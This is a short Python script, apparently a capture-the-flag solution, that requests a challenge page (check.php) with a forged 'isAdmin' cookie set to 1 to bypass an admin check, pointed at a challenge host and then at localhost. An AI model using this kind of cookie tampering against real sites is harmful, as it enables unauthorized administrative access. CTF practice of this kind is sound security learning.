import requests

url = 'http://chal1.sieberr.live:10011/check.php'
url = 'http://localhost:10011/check.php'

cookies = {'isAdmin':'1'}

r = requests.get(url, cookies=cookies)
print(r.text)